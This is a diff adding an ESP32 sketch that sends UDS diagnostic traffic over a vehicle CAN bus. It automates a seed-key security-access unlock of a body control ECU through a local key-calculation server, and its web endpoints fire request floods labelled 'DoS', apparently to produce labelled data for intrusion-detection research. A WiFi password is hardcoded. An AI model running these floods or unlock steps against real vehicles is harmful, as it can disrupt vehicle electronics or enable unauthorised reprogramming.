@@ -1,0 +1,456 @@
+#include <SPI.h>
+#include "mcp_can.h"
+#include <WiFi.h>
+#include <WebServer.h>
+#include <vector>
+#include <HTTPClient.h>
+#include <ArduinoJson.h>
+
+struct CANLogEntry {
+    float timestamp;
+    String channel;
+    String canType;
+    String frameType;
+    String canId;
+    int dlc;
+    String data;
+    String label;
+};
+
+const char* ssid = "RENAN97";
+const char* password = "renan123";
+
+WebServer server(80);
+
+const int CS_PIN = 4;
+const int CAN_INT_PIN = 27;
+const int CAN_DEBUG_LED = 25;
+
+MCP_CAN CAN(CS_PIN);
+bool startRequests = false;
+
+std::vector<CANLogEntry> canLog;
+
+String output = "";
+String logBuffer = "";
+bool recEDS = false;
+bool recProg = false;
+bool recSeed = false;
+bool unlocked = false;
+String seed = "";
+String key = "";
+
+const long FUNC_REQUEST_ID = 0x18DA40F1;
+// const long FUNC_REQUEST_ID_MUTATION = 0x18DB33F1;
+//const long BCM_RESPONSE_CAN_ID = 0x98DAF1CB;
+
+unsigned long startTime;
+bool mutationMode = false;
+bool activated = false;
+
+String convertDecimalToHex(long int decimalNumber) {
+    long int remainder,quotient;
+    int i=1,j,temp;
+    char hexadecimalNumber[100];
+    String hexString = "";
+    quotient = decimalNumber;
+
+    while(quotient!=0){
+        temp = quotient % 16;
+        if( temp < 10)
+            temp =temp + 48;
+        else
+            temp = temp + 55;
+
+        hexadecimalNumber[i++]= temp;
+        quotient = quotient / 16;
+    }
+
+    for(j = i -1; j > 0; j--) {
+        hexString += String(hexadecimalNumber[j]);
+    }
+    return hexString;
+}
+
+String convertBytesToString(const byte* data, size_t length) {
+    String result = "";
+    for (size_t i = 0; i < length; i++) {
+        if (data[i] < 0x10) {
+            result += "0";
+        }
+        result += String(data[i], HEX);
+        if (i < length - 1) {
+            result += " ";
+        }
+    }
+    result.toUpperCase();
+    return result;
+}
+
+void sendMessage(long id, byte* data, byte len, const char* description, String labelClass="NORMAL") {
+    String requestString = convertBytesToString(data, len);
+    
+    if (CAN.sendMsgBuf(id, 1, len, data) == CAN_OK) {
+        CANLogEntry entry = {
+            .timestamp = (millis() - startTime) / 1000.0,
+            .channel = "0",
+            .canType = "CAN",
+            .frameType = "Data",
+            .canId = "0x" + convertDecimalToHex(id),
+            .dlc = len,
+            .data = requestString,
+            .label = labelClass
+        };
+        canLog.push_back(entry);
+    } else {
+        logBuffer += String("Error: Failed to send ") + description + "\n";
+        CANLogEntry errorEntry = {
+            .timestamp = (millis() - startTime) / 1000.0,
+            .channel = "0",
+            .canType = "ERROR",
+            .frameType = "TX",
+            .canId = "0x" + convertDecimalToHex(id),
+            .dlc = (int)len,
+            .data = "FAILED TO SEND: " + String(description),
+            .label = "ERROR"
+        };
+        canLog.push_back(errorEntry);
+    }
+}
+
+String sendSeedToDllServer(String seed) {
+    String url = "http://172.20.36.140:5000/calc_key?seed=" + seed + "&cnt=0&algoID=0x05";
+    Serial.println(WiFi.localIP());
+    Serial.println(WiFi.status());
+    
+    HTTPClient http;
+    http.begin(url);
+    int httpCode = http.GET();
+    String key = "";
+
+    Serial.print("HTTP GET code: ");
+    Serial.println(httpCode);
+
+    if (httpCode > 0) {
+        String payload = http.getString();
+
+        // Allocate a JSON document
+        StaticJsonDocument<200> doc;
+
+        // Parse JSON
+        DeserializationError error = deserializeJson(doc, payload);
+        if (!error) {
+            key = doc["key"].as<String>();
+        } else {
+            Serial.println("JSON parse error: " + String(error.c_str()));
+        }
+    } else {
+        Serial.println("HTTP GET failed");
+        Serial.println(http.errorToString(httpCode));
+    }
+    http.end();
+    return key;
+}  
+
+void sendKey(String key) {
+    String byteString = "";
+
+    // Remove "0x" or "0X" prefix if present
+    if (key.startsWith("0x") || key.startsWith("0X")) {
+        key = key.substring(2);
+    }
+
+    byte key_0 = strtoul((key.substring(0 * 2, 0 * 2 + 2)).c_str(), nullptr, 16);
+    byte key_1 = strtoul((key.substring(1 * 2, 1 * 2 + 2)).c_str(), nullptr, 16);
+    byte key_2 = strtoul((key.substring(2 * 2, 2 * 2 + 2)).c_str(), nullptr, 16);
+    byte key_3 = strtoul((key.substring(3 * 2, 3 * 2 + 2)).c_str(), nullptr, 16);
+
+    byte udsRequestData[] = {0x06, 0x27, 0x02, key_0, key_1, key_2, key_3};
+
+    sendMessage(FUNC_REQUEST_ID, udsRequestData, sizeof(udsRequestData), "Sent Key");
+}
+
+void receiveCANMessage(String labelClass="NORMAL") {
+    long unsigned int rxId;
+    unsigned char len = 0;
+    unsigned char rxBuf[8];
+    
+    if (CAN.checkReceive() == CAN_MSGAVAIL) {
+        CAN.readMsgBuf(&rxId, &len, rxBuf);
+        if(rxId == 0x98DAF140) {
+            float relativeTime = (millis() - startTime) / 1000.0;
+            String dataHex = "";
+            String dataComp = "";
+            Serial.print("Received: ");
+
+            for (int i = 0; i < len; i++) {
+                if(rxBuf[i] < 0x10) { dataHex += "0"; }
+                dataHex += String(rxBuf[i], HEX);
+                dataComp += String(rxBuf[i], HEX) + " ";
+                if(i < len - 1) { dataHex += " "; }
+                Serial.print(rxBuf[i], HEX);
+                Serial.print(" ");
+                logBuffer += String(rxBuf[i], HEX) + " ";
+            }
+            output = logBuffer;
+            if(dataComp == "6 50 1 0 32 1 f4 ") { //EDS positive response
+                recEDS = true;
+                logBuffer += "\n";
+            }
+            if(dataComp == "6 50 2 0 32 1 f4 ") { //Programming Session positive response
+                recProg = true;
+                logBuffer += "\n";
+            }
+            if(dataComp == "6 67 1 ") { //Request Seed Session positive response              
+                logBuffer += "\n";
+                seed = "0x"+String(rxBuf[3], HEX)+String(rxBuf[4], HEX)+String(rxBuf[5], HEX)+String(rxBuf[6], HEX);
+                Serial.println("Seed:" + seed);      
+                key = sendSeedToDllServer(seed);
+                Serial.println("Calculated key from DLL: " + key);
+                recSeed = true;
+            }
+            if(dataComp == "2 67 2 ") {              
+                Serial.println("BCM ECU unlocked!");
+                unlocked = true;
+                logBuffer += "\n";
+            } 
+
+            CANLogEntry entry = {
+                .timestamp = relativeTime,
+                .channel = "0",
+                .canType = "CAN",
+                .frameType = "Data",
+                .canId = "0x" + String(rxId, HEX),
+                .dlc = len,
+                .data = dataHex,
+                .label = labelClass
+            };
+            entry.canId.toUpperCase();
+            canLog.push_back(entry);
+            // Serial.println();
+            // logBuffer += "\n";
+        }
+
+    }
+}
+
+void sendDiagnosticSessionRequest(String labelClass="NORMAL") {
+    byte udsRequestData[] = {0x02, 0x10, 0x01};
+    sendMessage(FUNC_REQUEST_ID, udsRequestData, sizeof(udsRequestData), "Diagnostic Session Control", labelClass);
+}
+
+void sendProgrammingSessionRequest(String labelClass="NORMAL") {
+    byte udsRequestData[] = {0x02, 0x10, 0x02};
+    sendMessage(FUNC_REQUEST_ID, udsRequestData, sizeof(udsRequestData), "Programming Session Control", labelClass);
+}
+
+void sendTesterPresent(String labelClass="NORMAL") {
+    byte udsRequestData[] = {0x02, 0x3E, 0x80, 0x55, 0x55, 0x55, 0x55, 0x55};
+    sendMessage(FUNC_REQUEST_ID, udsRequestData, sizeof(udsRequestData), "Tester Present", labelClass);
+}
+
+void sendSecurityRequestSeed(String labelClass="NORMAL") {
+    byte udsRequestData[] = {0x02, 0x27, 0x01};
+    sendMessage(FUNC_REQUEST_ID, udsRequestData, sizeof(udsRequestData), "Security Access Send Seed", labelClass);
+}
+
+void sendECUHardwareNumber(String labelClass="NORMAL") {
+    byte udsRequestData[] = {0x03, 0x22, 0xF1, 0x92};
+    sendMessage(FUNC_REQUEST_ID, udsRequestData, sizeof(udsRequestData), "ECU Hardware Number", labelClass);
+}
+
+void sendECUHardwareVersion(String labelClass="NORMAL") {
+    byte udsRequestData[] = {0x03, 0x22, 0xF1, 0x93};
+    sendMessage(FUNC_REQUEST_ID, udsRequestData, sizeof(udsRequestData), "ECU Hardware Version", labelClass);
+}
+
+void sendECUSoftwareNumber(String labelClass="NORMAL") {
+    byte udsRequestData[] = {0x03, 0x22, 0xF1, 0x94};
+    sendMessage(FUNC_REQUEST_ID, udsRequestData, sizeof(udsRequestData), "ECU Software Number", labelClass);
+}
+
+void sendECUSoftwareVersion(String labelClass="NORMAL") {
+    byte udsRequestData[] = {0x03, 0x22, 0xF1, 0x95};
+    sendMessage(FUNC_REQUEST_ID, udsRequestData, sizeof(udsRequestData), "ECU Software Version", labelClass);
+}
+
+void sendUDSRequest(String request) { 
+    // if(request == "sendECUHardwareNumber") {
+    //     sendECUHardwareNumber();
+    // } else if(request == "sendECUHardwareVersion") {
+    //     sendECUHardwareVersion();
+    // } else if(request == "sendECUSoftwareNumber") {
+    //     sendECUSoftwareNumber();
+    // } else if(request == "sendECUSoftwareVersion") {
+    //     sendECUSoftwareVersion();
+    if(request == "sendDDoSECUHardwareVersion") {
+        for(int i = 0; i < 100; i++) {
+            sendECUHardwareVersion("DoS");
+            receiveCANMessage("DoS");
+            Serial.println("Request sent: " + request);
+        }
+    } else if (request == "sendDDoSECUHardwareNumber") {
+        for(int i = 0; i < 100; i++) {
+            sendECUHardwareNumber("DoS");
+            receiveCANMessage("DoS");
+            Serial.println("Request sent: " + request);
+            delay(random(1, 30));
+        }
+    } else if (request == "sendDDoSECUSoftwareNumber") {
+        for(int i = 0; i < 100; i++) {
+            sendECUSoftwareNumber("DoS");
+            receiveCANMessage("DoS");
+            Serial.println("Request sent: " + request);
+            delay(random(1, 30));
+        }
+    } else if (request == "sendDDoSECUSoftwareVersion") {
+        for(int i = 0; i < 100; i++) {
+            sendECUSoftwareVersion("DoS");
+            receiveCANMessage("DoS");
+            Serial.println("Request sent: " + request);
+        }
+    } else {
+        Serial.println("Invalid request: " + request);
+        return;
+    }
+}
+
+// void faultInjection(String labelClass="DoS") {
+//     byte udsRequestData[] = {0x00, 0x39, 0x100, 0x00};
+//     sendMessage(FUNC_REQUEST_ID, udsRequestData, sizeof(udsRequestData), "Fault", labelClass);
+// }
+
+void setup() {
+    Serial.begin(115200);
+    WiFi.begin(ssid, password);
+    while (WiFi.status() != WL_CONNECTED) {
+        delay(500);
+        Serial.print(".");
+    }
+    Serial.println("\nWiFi connected");
+    Serial.println(WiFi.localIP());
+
+    if (CAN.begin(MCP_ANY, CAN_500KBPS, MCP_8MHZ) == CAN_OK) {
+        Serial.println("CAN Initialized Successfully!");
+    } else {
+        Serial.println("CAN Initialization Failed.");
+        while (1);
+    }
+
+    CAN.setMode(MCP_NORMAL);
+    pinMode(CAN_INT_PIN, INPUT);
+
+    server.on("/start", HTTP_GET, []() {
+        startRequests = true;
+        startTime = millis();
+        server.send(200, "text/plain", "UDS requests started");
+    });
+
+    server.on("/stop", HTTP_GET, []() {
+        startRequests = false;
+        server.send(200, "text/plain", "UDS requests stopped");
+    });
+
+    server.on("/log", HTTP_GET, []() {
+        server.send(200, "text/plain", logBuffer);
+    });
+
+    server.on("/clear_log", HTTP_GET, []() {
+        logBuffer = ""; canLog.clear();
+        server.send(200, "text/plain", "Log cleared");
+    });
+
+    server.on("/send", HTTP_GET, []() {
+        String request = server.arg("request");
+        if (request == "sendDDoSECUHardwareVersion" || request == "sendDDoSECUHardwareNumber" ||
+            request == "sendDDoSECUSoftwareNumber" || request == "sendDDoSECUSoftwareVersion") {
+            sendUDSRequest(request);
+            server.send(200, "text/plain", "Request sent: " + request);
+        } else {
+            server.send(400, "text/plain", "Invalid request");
+        }
+    });
+
+    //------- TESTING -------
+    server.on("/structured_log", HTTP_GET, []() {
+        String response = "[";
+        for(size_t i = 0; i < canLog.size(); i++) {
+            const CANLogEntry& entry = canLog[i];
+            response += "{";
+            response += "\"timestamp\":" + String(entry.timestamp, 6) + ",";
+            response += "\"channel\":\"" + entry.channel + "\",";
+            response += "\"canType\":\"" + entry.canType + "\",";
+            response += "\"frameType\":\"" + entry.frameType + "\",";
+            response += "\"canId\":\"" + entry.canId + "\",";
+            response += "\"dlc\":" + String(entry.dlc) + ",";
+            response += "\"data\":\"" + entry.data + "\",";
+            response += "\"label\":\"" + entry.label + "\"";
+            response += "}";
+
+            if (i < canLog.size() - 1) { response += ","; }
+        }
+        response += "]";
+        server.send(200, "application/json", response);
+    });
+
+    server.begin();
+    Serial.println("HTTP server started.");
+}
+
+void loop() {
+    server.handleClient();
+
+    if(startRequests) {
+        Serial.println("Count error TX" + CAN.errorCountTX());
+        Serial.println("Count error RX" + CAN.errorCountRX());
+
+        // sendECUHardwareNumber();
+        // receiveCANMessage();
+        // delay(200);
+
+        // sendECUHardwareVersion();
+        // receiveCANMessage();
+        // delay(200);
+
+        // sendECUSoftwareNumber();
+        // receiveCANMessage();
+        // delay(200);
+
+        // sendECUSoftwareVersion();
+        // receiveCANMessage();
+        // delay(200);
+        
+        if(!recEDS) {
+            sendDiagnosticSessionRequest();
+            receiveCANMessage();
+            delay(1000);
+        } 
+        
+        // fuzzyingTest();
+
+        if(!recProg && recEDS) {
+            sendProgrammingSessionRequest();
+            receiveCANMessage();
+            delay(2000);
+        }
+        
+        if(!recSeed && recProg && recEDS) {
+            sendSecurityRequestSeed();
+            receiveCANMessage();
+            delay(2000);
+        }
+        
+        if(recSeed && !unlocked) {
+            sendTesterPresent();
+            sendKey(key);
+            receiveCANMessage();
+            delay(1000);
+        }
+
+        if(unlocked) {
+            sendTesterPresent();
+            receiveCANMessage();
+            delay(1000);
+        }
+    }
+}
